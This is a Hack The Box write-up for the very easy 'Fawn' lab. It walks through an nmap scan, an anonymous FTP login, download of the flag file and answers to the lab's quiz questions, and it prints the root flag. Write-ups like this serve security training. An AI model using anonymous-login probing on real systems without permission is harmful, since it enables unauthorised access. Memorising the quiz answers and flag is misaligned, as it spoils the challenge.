---
layout: default
title: Fawn
parent: Very Easy
grand_parent: Hack The Box
nav_order: 2
tags:
  - FTP
  - Protocols
  - "#Reconnaissance"
  - Anonymous/GuestAccess
---

# Fawn

## Nmap Scan

```bash
❯ nmap -sV 10.129.1.14
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

Port 21 is open, I'll connect via `ftp` with `anonymous` account.

```bash
❯ ftp 10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:gato): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We're in!

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Let's get the flag with `get`

```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (76.7813 kB/s)
ftp> quit
221 Goodbye.

❯ cat flag.txt
035db21c881520061c53e0536e44f815
```

Thanks for reading! Now, let's answer the questions.

> -   **What does the 3-letter acronym FTP stand for?**
> 
> -   File Transfer Protocol

  

> -   **Which port does the FTP service listen on usually?**
> 
> -   21

  

> -   **What acronym is used for the secure version of FTP?**
> 
> -   sftp

  

> -   **What is the command we can use to send an ICMP echo request to test our connection to the target?**
> 
> -   ping

  

> -   **From your scans, what version is FTP running on the target?**
> 
> -   vsftpd 3.0.3

  

> -   **From your scans, what OS type is running on the target?**
> 
> -   unix

  

> -   **What is the command we need to run in order to display the 'ftp' client help menu?**
> 
> -   ftp -h

  

> -   **What is username that is used over FTP when you want to log in without having an account?**
> 
> -   anonymous

  

> -   **What is the response code we get for the FTP message 'Login successful'?**
> 
> -   230

  

> -   **There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.**
> 
> -   ls

  

> -   **What is the command used to download the file we found on the FTP server?**
> 
> -   get

  

> -   **Submit root flag**
> 
> -   035db21c881520061c53e0536e44f815


